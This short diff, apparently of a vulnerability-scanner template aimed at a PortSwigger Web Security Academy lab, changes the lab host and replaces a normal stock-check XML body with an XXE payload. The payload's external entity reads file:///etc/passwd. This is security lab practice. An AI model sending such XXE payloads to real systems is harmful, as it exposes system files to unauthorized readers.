@@ -11,10 +11,10 @@
             "Content-Type": "text/xml",
             "Accept": "*/*",
             "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0",
-            "Host":"0a860059030eb23fc0d917b40012003a.web-security-academy.net"
+            "Host":"0a5100ca0426e1b4c02c5319003a006f.web-security-academy.net"
            
         },
-        "body": "<stockCheck><productId>17</productId><storeId>1</storeId></stockCheck>"
+        "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>"
     },
 
     "matchers-condition": "or",
